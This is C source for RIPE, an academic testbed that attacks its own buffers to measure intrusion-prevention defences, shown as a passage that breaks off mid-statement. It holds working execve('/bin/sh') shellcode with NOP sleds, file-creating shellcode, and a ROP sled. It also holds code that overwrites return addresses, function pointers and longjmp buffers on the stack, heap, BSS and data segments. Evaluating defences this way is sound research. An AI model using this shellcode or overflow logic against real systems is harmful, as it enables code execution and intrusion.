/* RIPE was originally developed by John Wilander (@johnwilander)
 * and was debugged and extended by Nick Nikiforakis (@nicknikiforakis)
 *
 * Released under the MIT license (see file named LICENSE)
 *
 * This program is part the paper titled
 * RIPE: Runtime Intrusion Prevention Evaluator 
 * Authored by: John Wilander, Nick Nikiforakis, Yves Younan,
 *              Mariam Kamkar and Wouter Joosen
 * Published in the proceedings of ACSAC 2011, Orlando, Florida
 *
 * Please cite accordingly.
 */

#include "ripe_attack_generator.h"

/**
 * Shell code without NOP sled.
 * @author Aleph One
 */
static char shellcode_nonop[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_nonop = sizeof(shellcode_nonop) / sizeof(shellcode_nonop[0]) - 1;  // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

/**
 * Shell code with simple NOP sled
 * @author Pontus Viking
 * @author Aleph One
 */
static char shellcode_simplenop[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t size_shellcode_simplenop = sizeof(shellcode_simplenop) / sizeof(shellcode_simplenop[0]) - 1;  // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

/**
 * Shell code with polymorphic NOP sled
 * @author Pontus Viking
 * @author Aleph One
 */
static char shellcode_polynop[] =
"\x99\x96\x97\x93\x91\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97\x46\x4e\xf8"
"\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b\xf5\x45\x4c"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

static size_t  size_shellcode_polynop =
sizeof(shellcode_polynop) / sizeof(shellcode_polynop[0]) - 1;
/* Do not count for the null terminator since a null in the */
/* shellcode will terminate any lib string function */

/**
 * Shellcode with NOP sled that touches a file in the /tmp/rip-eval/ directory
 * @author Nick Nikiforakis
 * @email: nick.nikiforakis[put @ here]cs.kuleuven.be
 *
 */


static char createfile_shellcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xEB\x18\x5B\x31\xC0\x88\x43\x14\xB0\x08\x31\xC9\x66\xB9\xBC\x02\xCD\x80\x31\xC0\xB0\x01\x31\xDB"
"\xCD\x80\xE8\xE3\xFF\xFF\xFF/tmp/rip-eval/f_xxxx";


static size_t size_shellcode_createfile = sizeof(createfile_shellcode) / sizeof(createfile_shellcode[0]) - 1;

static char cf_ret_param[] = "/tmp/rip-eval/f_xxxx";
static char space_for_stack_growth[1024] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
static int fake_esp_jmpbuff[15] = {0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,
0xDEADBEEF,0xDEADBEEF,0xDEADBEEF,&exit, &cf_ret_param,448}; //448 => 0700 mode

/* DATA SEGMENT TARGETS */
/* Data segment buffers to inject into                                     */
/* Two buffers declared to be able to chose buffer address without NUL     */
/* Largest buffer declared last since it'll be "after" in the data seg     */
static char data_buffer1[1] = "d";
static char data_buffer2[128] = "dummy";
/* Target: Pointer in data segment for indirect attack                     */
/* Declared after injection buffers to place it "after" in the data seg    */
static long *data_mem_ptr = 0x0;
/* Target: Function pointer in data segment                                */
/* Declared after injection buffers since it'll be "after" in the data seg */
static int (*data_func_ptr2)(const char *) = &dummy_function;
static int (*data_func_ptr1)(const char *) = &dummy_function;
 /* Target: Longjump buffer in data segment                                */
 /* Declared after injection buffers to place it "after" on the data seg   */
static jmp_buf data_jmp_buffer = {0, 0, 0, 0, 0, 0};

int fooz(char *a, int b);
static struct attackme data_struct = {"AAAAAAAAAAAA",&fooz};



//NN: Moved away of harm's way (aka overflowing buffers in the data segment)
static char loose_change1[128];			//NN Sandwich the control vars
static boolean output_error_msg = TRUE;
static boolean output_debug_info = FALSE; /* Disables most effective attacks */
static boolean has_opened_output_stream = FALSE;
static ATTACK_FORM attack;
static char loose_change2[128];			//NN Sandwich the control vars

static int rop_sled[7] = {&gadget1 + 62,0xFFFFFFFF,&gadget2 + 62,&cf_ret_param,0xFFFFFFFF,&gadget3 + 62, &exit};

int fooz(char *a, int b){
	int zz,ff;

	zz =a ;
	ff = b;

	fprintf(stderr,"Fooz was called");
	return 1;
}

/**********/
/* MAIN() */
/**********/
int main(int argc, char **argv) {
  int option_char;
  int i = 0;
  FILE *output_stream;
  jmp_buf stack_jmp_buffer_param;

  //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
  jmp_buf stack_jmp_buffer_param_array[512];

  for(i=0; i < 512; i++){
	if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
		break;
  }
  if (i == 512){
	fprintf(stderr,"Error. Can't allocate appropriate stack_jmp_buffer\n");
	exit(1);
  }


  while((option_char = getopt(argc, argv, "t:i:c:l:f:d:e:o")) != -1) {
    switch(option_char) {
    case 't':
      set_technique(optarg);
      break;
    case 'i':
      set_inject_param(optarg);
      break;
    case 'c':
      set_code_ptr(optarg);
      break;
    case 'l':
      set_location(optarg);
      break;
    case 'f':
      set_function(optarg);
      break;
    case 'd':
      if(strcmp("t", optarg) == 0) {
	output_debug_info = TRUE;
	fprintf(stderr, "Set output_debug_info = TRUE\n");
      } else {
	output_debug_info = FALSE;
	fprintf(stderr,
		"Set output_debug_info = FALSE since option was \"%s\"\n",
		optarg);
      }
      break;
    case 'e':
      if(strcmp("t", optarg) == 0) {
	output_error_msg = TRUE;
	fprintf(stderr, "Set output_error_msg = TRUE\n");
      } else {
	output_error_msg = FALSE;
	fprintf(stderr,
		"Set output_error_msg = FALSE since option was \"%s\"\n",
		optarg);
      }
      break;
    case 'o':
      output_stream = fopen(optarg, "a+");
      if(output_stream == NULL) {
	if(output_error_msg) {
	  fprintf(stderr, "Error: Could not open file \"%s\"\n", optarg);
	}
      } else {
	has_opened_output_stream = TRUE;
      }
      break;
    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown command option \"%s\"\n", optarg);
      }
      exit(1);
      break;
    }
  }

  /* If no output option set default */
  if(!has_opened_output_stream && output_debug_info) {
    //    output_stream = stdout;
    output_stream = fopen(DEBUG_MEMDUMP, "a+");
    if(output_stream == NULL) {
      if(output_error_msg) {
	fprintf(stderr, "Error: Could not open file \"debug.txt\"\n");
      }
    } else {
      has_opened_output_stream = TRUE;
    }
  }

  setenv("param_to_system", "/bin/sh", 1);
  setenv("param_to_creat", "/tmp/rip-eval/f_xxxx",1); //NN

  if(output_debug_info) {
    printf("getenv(\"param_to_system\") = %x\n", getenv("param_to_system"));
    printf("&system = %p\n", &system);
  }

  /* Check if attack form is possible */
  if(is_attack_possible()) {
    //NN
    perform_attack(output_stream, &dummy_function, stack_jmp_buffer_param_array[i]);
  } else {
    exit(ATTACK_IMPOSSIBLE);
  }


  if(has_opened_output_stream) {
    fclose(output_stream);
  }
}


//Data Segment Attack vectors where here
//but they were moved to the top of the file
//so that they won't overflow into control variables

//reliable ways to get the adresses of the return address and old base pointer
#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

/********************/
/* PERFORM_ATTACK() */
/********************/
void perform_attack(FILE *output_stream,
		    int (*stack_func_ptr_param)(const char *),
		    jmp_buf stack_jmp_buffer_param) {

  /* STACK TARGETS */
  /* Target: Longjump buffer on stack                                       */
  /* Declared before injection buffers to place it "below" on the stack     */
  jmp_buf stack_jmp_buffer;
  /* Target: Function pointer on stack                                      */
  /* Declared before injection buffers to place it "below" on the stack     */
  int (*stack_func_ptr)(const char *);
  /* Target: Pointer on stack for indirect attack                           */
  /* Declared before injection buffers to place it "below" on the stack     */
  /* Declared adjacent to the injection buffers, at the top of the stack,   */
  /* so an indirect attack won't overflow the stack target code pointers    */
  /* when overflowing the indirect pointer                                  */
  long *stack_mem_ptr;
  /* Stack buffers to inject into                                           */
  /* Two buffers declared to be able to chose buffer address without NUL    */
  /* Largest buffer declared first since it'll be "below" on the stack      */
 // char stack_buffer1[128];
 // char stack_buffer2[1];

  char stack_buffer[1024];
  //JMP_BUF for indirect attacks
  jmp_buf stack_jmp_buffer_indirect[512];
  struct attackme stack_struct;
  stack_struct.func_ptr = fooz;

 

  /* HEAP TARGETS */
  /* Heap buffers to inject into                                            */
  /* Two buffers declared to be able to chose buffer that gets allocated    */
  /* first on the heap. The other buffer will be set as a target, i.e. a    */
  /* heap array of function pointers.                                       */
  char *heap_buffer1 = (char *)malloc(128 + sizeof(long));
  char *heap_buffer2 = (char *)malloc(128 + sizeof(long));
  char *heap_buffer3 = (char *)malloc(128 + sizeof(long));
  /* Target: Pointer on heap for indirect attack                            */
  /* Declared after injection buffers to place it "after" on the heap       */
  long *heap_mem_ptr;
  /* Target: Function pointer on heap                                       */
  /* This pointer is set by collecting a pointer value in the function      */
  /* pointer array.                                                         */
  int (*heap_func_ptr)(const char *);
  /* Target: Longjmp buffer on the heap                                     */
  /* Declared after injection buffers to place it "after" on the heap       */
  //jmp_buf heap_jmp_buffer;
   jmp_buf *heap_jmp_buffer; //NN Here it is just a pointer...

  struct attackme *heap_struct = (struct attackme*)malloc(sizeof(struct attackme));
  heap_struct->func_ptr = fooz;


  /* BSS TARGETS */
  /* Target: Pointer in BSS segment for indirect attack                     */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static long bss_dummy_value;
  static long *bss_mem_ptr;
  /* Target: Function pointer in BSS segment                                */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static int (*bss_func_ptr)(const char *);
  /* Target: Longjmp buffer in BSS segment                                  */
  /* Declared after injection buffers to place it "after" in the BSS seg    */
  static jmp_buf bss_jmp_buffer;
  static char placeholder[128]; //NN provide enough space for shellcode 
  /* BSS buffers to inject into                                             */
  /* Two buffers declared to be able to chose buffer address without NUL    */
  /* Largest buffer declared last since it'll be "after" in the BSS seg     */
  static char bss_buffer1[1];
  static char bss_buffer2[128];
  static jmp_buf bss_jmp_buffer_indirect;

  static struct attackme bss_struct;
  




  /* Pointer to buffer to overflow */
  char *buffer, *dump_start_addr;
  /* Address to target for direct (part of) overflow */
  void *target_addr;
  /* Buffer for storing a generated format string */
  char format_string_buf[16];
  /* Temporary storage of payload for overflow with fscanf() */
  FILE *fscanf_temp_file;
  CHARPAYLOAD payload;

  /* Storage of debug memory dumps (used for debug output) */
  MEM_DUMP mem_dump1[DEFAULT_DUMP_SIZE];
  MEM_DUMP mem_dump2[DEFAULT_DUMP_SIZE];
  MEM_DUMP payload_dump[DEFAULT_DUMP_SIZE];

  if(output_debug_info) {
    dump_start_addr = format_string_buf;
  } /* DEBUG */

  /* Check that malloc went fine */
  if(heap_buffer1 == NULL || heap_buffer2 == NULL) {
    perror("Unable to allocate heap memory.");
    exit(1);
  }

  /* Initialize function pointers to point to dummy function so    */
  /* that if the attack fails there will still be code to execute  */
  stack_func_ptr = &dummy_function;
  //  heap_func_ptr = &dummy_function;
  bss_func_ptr = &dummy_function;

  /***************************************/
  /* Set location for buffer to overflow */
  /***************************************/
  switch(attack.location) {
  case STACK:
    /* Injection into stack buffer                           */
    /* Make sure that we start injecting the shellcode on an */
    /* address not containing any terminating characters     */

    //NN: Special case for stack_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_STACK){
	buffer = stack_struct.buffer;
	break;
    }

    /* NN: Trying addresses until correct */
    buffer = stack_buffer;
    while (contains_terminating_char((unsigned long)buffer)){
	buffer += rand() % 10;
	fprintf(stderr,"Trying %p\n",buffer);
    }
    /* Out of Bounds */
    if (buffer > stack_buffer + sizeof(stack_buffer) - 100){
	fprintf(stderr,"Error. Couldn't find appropriate buffer on the stack\n");
	exit(1);
    }

    // Also set the location of the function pointer and the
    // longjmp buffer on the heap (the same since only choose one)
    heap_func_ptr = (void *)heap_buffer1;
    //    heap_jmp_buffer = (void *)heap_buffer1;
    break;
  case HEAP:
    /* Injection into heap buffer                            */

    //NN: Special case for heap_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_HEAP){
	buffer = heap_struct->buffer;
	break;
    }


    if(((unsigned long)heap_buffer1 < (unsigned long)heap_buffer2) &&
       ((unsigned long)heap_buffer2 < (unsigned long)heap_buffer3)) {
      buffer = heap_buffer1;
      // Set the location of the memory pointer on the heap
      heap_mem_ptr = (long *)heap_buffer2;
      // Also set the location of the function pointer and the
      // longjmp buffer on the heap (the same since only choose one)
      heap_func_ptr = (void *)heap_buffer3;
      //      heap_jmp_buffer = (int *)heap_buffer3;    //NN heap_jmp_buffer still doesn't point anywhere
      heap_jmp_buffer = (int *)malloc(sizeof(jmp_buf)); //NN Now it does...hopefully in the correct order
    } else {
      if(output_error_msg) {
	fprintf(stderr, "Error: Heap buffers allocated in the wrong order.\n");
      }
      exit(1);
    }
    break;
  case BSS:
    /* Injection into BSS buffer                             */
    /* Make sure that we start injecting the shellcode on an */
    /* address not containing any terminating characters     */
    /* @todo ensure that the chosen address truly is correct */
 
   //NN: Special case for bss_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_BSS){
	buffer = bss_struct.buffer;
	break;
    }

    if(contains_terminating_char((unsigned long)&bss_buffer1)) {
      buffer = bss_buffer2;
    } else {
    /* @todo Currently just assumes the next address is OK   */
      buffer = bss_buffer1;
    }
    // Also set the location of the function pointer and the
    // longjmp buffer on the heap (the same since only choose one)
    heap_func_ptr = (void *)heap_buffer1;
    //    heap_jmp_buffer = (int *)heap_buffer1;
    break;
  case DATA:
    /* Injection into data segment buffer                    */
    /* Make sure that we start injecting the shellcode on an */
    /* address not containing any terminating characters     */
    /* @todo ensure that the chosen address truly is correct */

    //NN: Special case for stack_struct 
    if(attack.code_ptr == STRUCT_FUNC_PTR_DATA){
	buffer = data_struct.buffer;
	break;
    }

    if(contains_terminating_char((unsigned long)&data_buffer1)) {
      buffer = data_buffer2;
    } else {
    /* @todo Currently just assumes the next address is OK   */
      buffer = data_buffer1;
    }
    // Also set the location of the function pointer and the
    // longjmp buffer on the heap (the same since only choose one)
    heap_func_ptr = (void *)heap_buffer1;
    //    heap_jmp_buffer = heap_buffer1;
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of location\n");
    }
    exit(1);
    break;
  }

  /************************************/
  /* Set target address for overflow, */
  /* (used to calculate payload size) */
  /************************************/
  switch(attack.technique) {
  case DIRECT:
    switch(attack.code_ptr) {
    case RET_ADDR:
      target_addr = RET_ADDR_PTR;
      break;
    case OLD_BASE_PTR:
      target_addr = OLD_BP_PTR;
      break;
    case FUNC_PTR_STACK_VAR:
      target_addr = &stack_func_ptr;
      break;
    case FUNC_PTR_STACK_PARAM:
      target_addr = &stack_func_ptr_param;
      break;
    case FUNC_PTR_HEAP:
      target_addr = heap_func_ptr;
      break;
    case FUNC_PTR_BSS:
      target_addr = &bss_func_ptr;
      break;
    case FUNC_PTR_DATA:
      target_addr = &data_func_ptr1;
      break;
    case LONGJMP_BUF_STACK_VAR:
      target_addr = &stack_jmp_buffer[0].__jmpbuf[5];
      break;
    case LONGJMP_BUF_STACK_PARAM:
      target_addr = &stack_jmp_buffer_param[0].__jmpbuf[5];
      break;
    case LONGJMP_BUF_HEAP:
      //target_addr = &heap_jmp_buffer[0].__jmpbuf[5];
      printf("heap_jmp_buffer @%p\n",heap_jmp_buffer);
      target_addr = (void *)heap_jmp_buffer + 20; //NN now it should point to the correct entry of the
					//jmp_buf structure
      break;
    case LONGJMP_BUF_BSS:
      target_addr = &bss_jmp_buffer[0].__jmpbuf[5];
      break;
    case LONGJMP_BUF_DATA:
      target_addr = &data_jmp_buffer[0].__jmpbuf[5];
      break;
    case STRUCT_FUNC_PTR_STACK:
      target_addr = &stack_struct.func_ptr;
      break;
    case STRUCT_FUNC_PTR_HEAP:
      target_addr = (void *)heap_struct + 256; 
      break;
    case STRUCT_FUNC_PTR_DATA:
      target_addr = &data_struct.func_ptr;
      break;
    case STRUCT_FUNC_PTR_BSS:
      target_addr = &bss_struct.func_ptr;
      break;

    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of code pointer\n");
      }
      exit(1);
      break;
    }
    break;
  case INDIRECT:
    switch(attack.location) {
    case STACK:
      target_addr = &stack_mem_ptr;
      break;
    case HEAP:
      target_addr = heap_mem_ptr;
      break;
    case BSS:
      target_addr = &bss_mem_ptr;
      bss_mem_ptr = &bss_dummy_value;
      break;
    case DATA:
      target_addr = &data_mem_ptr;
      printf("Indirect attack, DATA SEGMENT target addr\n");
      break;
    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of pointer\n");
      }
      exit(1);
      break;
    }
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of technique\n");
    }
    exit(1);
    break;
  }


  /*********************/
  /* Configure payload */
  /*********************/

  payload.ptr_to_correct_return_addr = RET_ADDR_PTR;

  // Set longjmp buffers
  switch(attack.code_ptr) {
  case LONGJMP_BUF_STACK_VAR:
    if(setjmp(stack_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    payload.jmp_buffer = &stack_jmp_buffer;
    break;
  case LONGJMP_BUF_STACK_PARAM:
    if(setjmp(stack_jmp_buffer_param) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    payload.jmp_buffer = (void *)stack_jmp_buffer_param;
    payload.stack_jmp_buffer_param = &stack_jmp_buffer_param;
    break;
  case LONGJMP_BUF_HEAP:
    if(setjmp(heap_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    
    payload.jmp_buffer = (void *)heap_jmp_buffer;
    payload.stack_jmp_buffer_param = NULL;
    break;
  case LONGJMP_BUF_BSS:
    if(setjmp(bss_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    printf("bss_jmp_buffer is set\n");
    payload.jmp_buffer = (void *)bss_jmp_buffer;
    payload.stack_jmp_buffer_param = NULL;
   //NN added second setjmp to populate indirect_jmp_buffer
   if(setjmp(bss_jmp_buffer_indirect) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }
    break;
  case LONGJMP_BUF_DATA:
    if(setjmp(data_jmp_buffer) != 0) {
    /* setjmp() returns 0 if returning directly and non-zero when returning */
    /* from longjmp() using the saved context. Attack failed.               */
      return;
    }

    payload.jmp_buffer = (void *)data_jmp_buffer;
    payload.stack_jmp_buffer_param = NULL;
    break;
  default:
    // Not an attack against a longjmp buffer
    break;
  }

  payload.inject_param = attack.inject_param;

  switch(attack.technique) {
  case DIRECT:
    /* Here payload.overflow_ptr will point to the attack code since */
    /* a direct attack overflows the pointer target directly         */
    switch(attack.inject_param) {
    case INJECTED_CODE_NO_NOP:
    case INJECTED_CODE_SIMPLE_NOP:
    case INJECTED_CODE_POLY_NOP:
    case CREATE_FILE:
      payload.overflow_ptr = buffer;
      break;
    case RETURN_INTO_LIBC:
      if(attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
	 attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
	 attack.code_ptr == LONGJMP_BUF_HEAP ||
	 attack.code_ptr == LONGJMP_BUF_BSS ||
	 attack.code_ptr == LONGJMP_BUF_DATA) {
	//NN: We fixed this piece of code to actually call
	//a usefull system call. We now re-write the esp pointer
	//inside the jmpbuf structure along with the eip to provide
	//the correct arguments to creat
	payload.overflow_ptr = &creat; //NN
      } else {
	payload.overflow_ptr = &creat; //NN42 
      }
      break;

    case RETURN_ORIENTED_PROGRAMMING:
	payload.overflow_ptr = rop_sled;
	break;

    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of attack parameterA\n");
      }
      exit(1);
      break;
    }
    break;
  case INDIRECT:
    /* Here payload.overflow_ptr will point to the final pointer target   */
    /* since an indirect attack first overflows a general pointer that in */
    /* turn is dereferenced to overwrite the target pointer               */
    switch(attack.code_ptr) {
    case RET_ADDR:
      payload.overflow_ptr = RET_ADDR_PTR;
      break;
    case OLD_BASE_PTR:
      payload.overflow_ptr = OLD_BP_PTR;
      //NN:Change this when we change the return into libc from system to creat
      if(attack.inject_param == RETURN_INTO_LIBC) {
	payload.fake_return_addr = &creat; //NN42
      } else {
	payload.fake_return_addr = (long *)buffer;
      }
      break;
    case FUNC_PTR_STACK_VAR:
      payload.overflow_ptr = &stack_func_ptr;
      break;
    case FUNC_PTR_STACK_PARAM:
      payload.overflow_ptr = &stack_func_ptr_param;
      break;
    case FUNC_PTR_HEAP:
      payload.overflow_ptr = heap_func_ptr;
      break;
    case FUNC_PTR_BSS:
      payload.overflow_ptr = &bss_func_ptr;
      break;
    case FUNC_PTR_DATA:
	//NN ofcourse we are not sure if the else is correct...we will see
      if (contains_terminating_char(&data_func_ptr1))
	payload.overflow_ptr = &data_func_ptr2;
      else
      	payload.overflow_ptr = &data_func_ptr1;
      break;
    case LONGJMP_BUF_STACK_VAR:
      payload.overflow_ptr = &stack_jmp_buffer[0].__jmpbuf[5];
      break;
    case LONGJMP_BUF_STACK_PARAM:
      payload.overflow_ptr = &stack_jmp_buffer_param[0].__jmpbuf[5];
      break;
    case LONGJMP_BUF_HEAP:
      //payload.overflow_ptr = &heap_jmp_buffer[0].__jmpbuf[5];
      payload.overflow_ptr = (void *)heap_jmp_buffer + 20; // NN
      break;
    case LONGJMP_BUF_BSS:
      //payload.overflow_ptr = &bss_jmp_buffer[0].__jmpbuf[5];
      payload.overflow_ptr = &bss_jmp_buffer_indirect[0].__jmpbuf[5]; //NN
      break;
    case LONGJMP_BUF_DATA:
      payload.overflow_ptr = &data_jmp_buffer[0].__jmpbuf[5];
      break;
    default:
      if(output_error_msg) {
	fprintf(stderr, "Error: Unknown choice of code pointer\n");
      }
      exit(1);
      break;
    }
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of technique\n");
    }
    exit(1);
    break;
  }

  /* Calculate payload size for overflow of chosen target address */
  if ((unsigned long)target_addr > (unsigned long)buffer) {
    payload.size =
      (unsigned int)((unsigned long)target_addr + sizeof(long)
		     - (unsigned long)buffer
		     + 1); /* For null termination so that buffer can be     */
                           /* used with string functions in standard library */
     fprintf(stderr, "target_addr == %p\n", target_addr);
     fprintf(stderr, "buffer == %p\n", buffer);
     fprintf(stderr, "psize == %d\n",payload.size);
     fprintf(stderr, "stack_buffer == %p\n", stack_buffer);


  } else {
    if(output_error_msg) {
      fprintf(stderr,
	      "Error: Target address is lower than address of overflow buffer.\n");
      fprintf(stderr,
	      " Overflow direction is towards higher addresses.\n");
      fprintf(stderr, "target_addr == %p\n", target_addr);
      fprintf(stderr, "heap_func_ptr == %p\n", heap_func_ptr);
      fprintf(stderr, "buffer == %p\n", buffer);
      fprintf(stderr, "payload.size == %d\n", payload.size);
    }
    exit(1); 
  }
  /* Set first byte of buffer to null to allow concatenation functions to */
  /* start filling the buffer from that first byte                        */
  buffer[0] = '\0';

  if(output_debug_info) {
    fprintf(output_stream, "&target_addr = %lx, target_addr = %lx, *target_addr = %lx\n",
	    (long)&target_addr, (long)target_addr, *(long *)target_addr);
    fprintf(output_stream, "&stack_mem_ptr = %lx, stack_mem_ptr = %lx, *stack_mem_ptr = %lx\n",
	    (long)&stack_mem_ptr, (long)stack_mem_ptr, (long)*stack_mem_ptr);
    fprintf(output_stream, "&buffer = %lx, buffer = %lx\n",
	    (long)&buffer, (long)buffer);
  }


  /*****************/
  /* Build payload */
  /*****************/

  if(!build_payload(&payload)) {
    if(output_error_msg) {
      fprintf(stderr, "Error: Could not build payload\n");
      fflush(stderr);
    }
    exit(1);
  }

  /* Special case: Attacks on old base pointer */
  if(attack.technique == DIRECT &&
     attack.code_ptr == OLD_BASE_PTR) {

    /* Configure so that old base pointer will be overwritten to     */
    /* point to the copied base pointer in the injected fake stack   */
    /* frame. This needs to be done here since only now do we know   */
    /* on which address the copied base pointer ends up. The offset  */
    /* has been set on the build_payload() function.                 */

    // First - point to the copied base pointer
    stack_mem_ptr = (long *)(buffer +        // start
			     payload.size -  // end
			     1 -             // null terminator
			     sizeof(long) -  // copied correct ret
			     sizeof(long) -  // injected new base ptr
			     payload.offset_to_fake_return_addr -
			     sizeof(long));  // the copied base ptr

    // Make indirect reference so that overwritten base ptr points
    // to the copied base ptr futher up the stack
    payload.overflow_ptr = &stack_mem_ptr;

    // Copy pointer to copied base pointer
    memcpy(&payload.buffer[payload.size -    // start
			   1 -               // null terminator
			   sizeof(long) -    // copied correct ret
			   sizeof(long)],    // injected new base ptr
	   payload.overflow_ptr,
	   sizeof(long));
  }

  if(output_debug_info) {
    save_memory(payload_dump, payload.buffer,
		((payload.size / sizeof(long)) +
		 (payload.size % sizeof(long))));
    
    // Output some addresses and values
    fprintf(output_stream, "Address to payload->buffer: %lx\n", &(payload.buffer));
    fprintf(output_stream, "Value of payload->buffer: %lx\n", (payload.buffer));
    fprintf(output_stream, "Address to overflow buffer: %lx\n", (long)buffer);
    fprintf(output_stream, "Value of overflow buffer: %lx\n", *buffer);
    fprintf(output_stream, "payload.overflow_ptr: %lx\n", payload.overflow_ptr);
    // Output payload info
    print_payload_info(output_stream, &payload);
    // Save stack before overflow
    save_memory(mem_dump1, dump_start_addr, DEFAULT_DUMP_SIZE);
  } /* DEBUG */


  /****************************************/
  /* Overflow buffer with chosen function */
  /* Note: Here memory will be corrupted  */
  /****************************************/
  switch(attack.function) {
  case MEMCPY:
    // memcpy() shouldn't copy the terminating NULL, therefore - 1
    memcpy(buffer, payload.buffer, payload.size - 1);
    break;
  case STRCPY:
    strcpy(buffer, payload.buffer);
    break;
  case STRNCPY:
    strncpy(buffer, payload.buffer, payload.size);
    break;
  case SPRINTF:
    sprintf(buffer, "%s", payload.buffer);
    break;
  case SNPRINTF:
    snprintf(buffer, payload.size, "%s", payload.buffer);
    break;
  case STRCAT:
    strcat(buffer, payload.buffer);
    break;
  case STRNCAT:
    strncat(buffer, payload.buffer, payload.size);
    break;
  case SSCANF:
    snprintf(format_string_buf, 15, "%%%ic", payload.size);
    sscanf(payload.buffer, format_string_buf, buffer);
    break;
  case FSCANF:
    snprintf(format_string_buf, 15, "%%%ic", payload.size);
    fscanf_temp_file = fopen("./fscanf_temp_file", "w+");
    fprintf(fscanf_temp_file, "%s", payload.buffer);
    rewind(fscanf_temp_file);
    fscanf(fscanf_temp_file, format_string_buf, buffer);

    /**  Fclose will try to do pointer arithmetic with ebp which is now broken and thus will crash
     *   instead of returning... when this function returns, then the shellcode is triggered correctly 
     
     *fclose(fscanf_temp_file);
     *unlink("./fscanf_temp_file");
    **/
    break;
  case HOMEBREW:
    homebrew_memcpy(buffer, payload.buffer, payload.size - 1);
    break;
  default:
    if(output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of function\n");
    }
    exit(1);
    break;
  }


  /*******************************************/
  /* Ensure that code pointer is overwritten */
  /*******************************************/

  switch(attack.technique) {
  case DIRECT:
    /* Code pointer already overwritten */
    break;
  case INDIRECT:
    switch(attack.inject_param) {
    case INJECTED_CODE_NO_NOP:
    case INJECTED_CODE_SIMPLE_NOP:
    case INJECTED_CODE_POLY_NOP:
    case CREATE_FILE:

      if(attack.code_ptr == OLD_BASE_PTR) {
	// Point to the old base pointer of the fake stack frame
	*(long *)(*(long *)target_addr) = 
	  (long)(buffer +        // start
		 payload.size -  // end
		 1 -             // null terminator
		 sizeof(long) -  // injected new base ptr
		 payload.offset_to_fake_return_addr -
		 sizeof(long));  // the copied base ptr

      } else {
	// Point to the attack code
	*(long *)(*(long *)target_addr) = (long)buffer;
      }
      break;
    case RETURN_INTO_LIBC:
      if(attack.code_ptr == RET_ADDR ||
	 attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
	 attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
	 attack.code_ptr == LONGJMP_BUF_HEAP ||
	 attack.code_ptr == LONGJMP_BUF_BSS ||
	 attack.code_ptr == LONGJMP_BUF_DATA) {
	/* Note: These attack forms are considered impossible           */
	/* When overflowing the return address or the code pointer in a */
	/* longjmp buffer it's complicated to pass on parameters to the */
	/* libc function, but sleep() accepts most params               */
	//*(long *)(*(long *)target_addr) = (long)&sleep;
	*(long *)(*(long *)target_addr) = (long)&creat; //NN
      } else if(attack.code_ptr == OLD_BASE_PTR) {
	// First - point to the copied base pointer
	*(long *)(*(long *)target_addr) =
	  (long *)(buffer +        // start
		   payload.size -  // end
		   1 -             // null terminator
		   sizeof(long) -  // injected memory pointer
